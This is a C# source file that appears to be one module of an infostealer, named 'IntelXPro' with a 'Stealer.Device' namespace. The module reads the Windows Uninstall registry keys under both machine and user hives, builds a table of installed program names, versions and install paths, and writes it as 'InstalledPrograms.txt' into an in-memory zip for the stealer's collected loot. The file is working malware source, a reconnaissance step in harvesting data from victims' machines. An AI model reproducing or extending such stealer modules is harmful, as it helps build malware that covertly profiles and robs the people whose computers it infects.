using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class InstalledPrograms : ITarget
    {
        private class InstalledProgram
        {
            public string Name { get; set; }

            public string Version { get; set; }

            public string InstallLocation { get; set; }
        }

        public void Collect(InMemoryZip zip, Counter counter)
        {
            List<InstalledProgram> list = new string[2] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" }.SelectMany((string key) => GetInstalledPrograms(key, Registry.LocalMachine, counter).Concat(GetInstalledPrograms(key, Registry.CurrentUser, counter))).ToList();
            if (list.Count != 0)
            {
                int maxName = Math.Max("Name".Length, list.Max((InstalledProgram p) => p.Name?.Length ?? 0));
                int maxVersion = Math.Max("Version".Length, list.Max((InstalledProgram p) => p.Version?.Length ?? 0));
                int maxPath = Math.Max("Path".Length, list.Max((InstalledProgram p) => p.InstallLocation?.Length ?? 0));
                List<string> list2 = new List<string>();
                list2.Add("Name".PadRight(maxName) + " | " + "Path".PadRight(maxPath) + " | " + "Version".PadRight(maxVersion));
                list2.Add(new string('-', maxName + maxPath + maxVersion + 6));
                List<string> list3 = list2;
                list3.AddRange(list.Select((InstalledProgram p) => (p.Name ?? "Unknown").PadRight(maxName) + " | " + (p.InstallLocation ?? "Unknown").PadRight(maxPath) + " | " + (p.Version ?? "Unknown").PadRight(maxVersion)));
                zip.AddTextFile("InstalledPrograms.txt", string.Join("\n", list3));
            }
        }

        private static List<InstalledProgram> GetInstalledPrograms(string uninstallKey, RegistryKey root, Counter counter)
        {
            ConcurrentBag<InstalledProgram> installedPrograms = new ConcurrentBag<InstalledProgram>();
            using (RegistryKey registryKey = root.OpenSubKey(uninstallKey))
            {
                if (registryKey == null)
                {
                    return new List<InstalledProgram>();
                }
                string[] subKeyNames = registryKey.GetSubKeyNames();
                if (subKeyNames == null || subKeyNames.Length == 0)
                {
                    return new List<InstalledProgram>();
                }
                Parallel.ForEach(subKeyNames, delegate (string subkeyName)
                {
                    try
                    {
                        using (RegistryKey registryKey2 = root.OpenSubKey(uninstallKey + "\\" + subkeyName))
                        {
                            string text = registryKey2?.GetValue("DisplayName") as string;
                            if (!string.IsNullOrEmpty(text))
                            {
                                InstalledProgram item = new InstalledProgram
                                {
                                    Name = text.Trim(),
                                    Version = ((registryKey2.GetValue("DisplayVersion") as string) ?? "Unknown"),
                                InstallLocation = ((registryKey2.GetValue("InstallLocation") as string) ?? "Unknown")
                                };
                                installedPrograms.Add(item);
                            }
                        }
                    }
                    catch
                    {
                    }
                });
            }
            return installedPrograms.ToList();
        }
    }
}
